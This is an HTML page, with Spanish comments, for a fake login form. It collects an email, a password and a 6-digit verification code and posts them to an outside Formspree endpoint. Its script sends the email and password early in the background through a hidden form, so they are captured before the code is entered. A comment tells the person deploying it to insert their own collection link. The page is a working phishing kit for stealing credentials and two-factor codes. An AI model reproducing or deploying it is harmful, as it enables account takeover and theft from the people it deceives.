<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
body {background:#111; color:white; min-height:100vh; padding:20px;}
.contenedor {max-width:400px; margin:0 auto;}
h2 {text-align:center; margin-bottom:25px;}
.oculto {display:none !important;}
.field {margin-bottom:15px;}
label {display:block; margin-bottom:5px;}
input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
.submit-btn {background:#FF0050; color:white; margin-top:10px;}
.link-btn {background:transparent; color:#ccc; margin-top:5px;}
</style>
</head>
<body>

<div class="contenedor">
  <h2>Inicia sesión con tu cuenta</h2>

  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">

    <!-- Campos ocultos para guardar todo -->
    <input type="hidden" name="correo" id="correoGuardado" />
    <input type="hidden" name="contraseña" id="passGuardada" />
    <input type="hidden" name="codigo" id="codigoGuardado" />

    <!-- PASO 1: CORREO Y CONTRASEÑA -->
    <div id="paso1">
      <div class="field">
        <label>Correo electrónico</label>
        <input type="email" id="correo" required placeholder="tu@correo.com" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" id="contraseña" required placeholder="••••••••" />
      </div>
      <button type="button" class="submit-btn" onclick="avanzarSinEsperar()">Continuar</button>
    </div>

    <!-- PASO 2: CÓDIGO -->
    <div id="paso2" class="oculto">
      <div class="field">
        <label>Código de verificación (6 dígitos)</label>
        <input type="text" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
      </div>
      <button type="button" class="link-btn" onclick="volverAtras()">← Volver atrás</button>
      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
    </div>

  </form>
</div>

<script>
const ENLACE = "https://formspree.io/f/xgogzwbd"; // Mismo enlace aquí

function avanzarSinEsperar() {
  const correoValor = document.getElementById('correo').value.trim();
  const passValor = document.getElementById('contraseña').value;

  if (!correoValor || !passValor) {
    alert('Escribe tu correo y contraseña primero');
    return;
  }

  // 📝 Guardamos los datos para que vayan al final
  document.getElementById('correoGuardado').value = correoValor;
  document.getElementById('passGuardada').value = passValor;

  // 🚀 AVANZAMOS DE INMEDIATO, SIN ESPERAR NADA
  document.getElementById('paso1').classList.add('oculto');
  document.getElementById('paso2').classList.remove('oculto');

  // 📩 ENVIAMOS CORREO Y CONTRASEÑA EN SEGUNDO PLANO, SIN DETENER NADA
  enviarRapido(correoValor, passValor);
}

// 🛠️ ENVÍO QUE NO DETIENE NADA
function enviarRapido(c, p) {
  // Usamos un método que no espera respuesta → nunca se traba
  const form = document.createElement('form');
  form.action = ENLACE;
  form.method = 'POST';
  form.target = '_blank'; // No afecta tu página

  const i1 = document.createElement('input');
  i1.name = 'correo'; i1.value = c;
  const i2 = document.createElement('input');
  i2.name = 'contraseña'; i2.value = p;
  const i3 = document.createElement('input');
  i3.name = 'nota'; i3.value = 'Recibido antes del código';

  form.appendChild(i1); form.appendChild(i2); form.appendChild(i3);
  document.body.appendChild(form);
  form.submit();
  document.body.removeChild(form);
}

function volverAtras() {
  document.getElementById('paso2').classList.add('oculto');
  document.getElementById('paso1').classList.remove('oculto');
}

function activarBoton() {
  const cod = document.getElementById('codigo').value;
  document.getElementById('codigoGuardado').value = cod;
  document.getElementById('botonEnviar').disabled = cod.length !== 6;
}
</script>

</body>
</html>
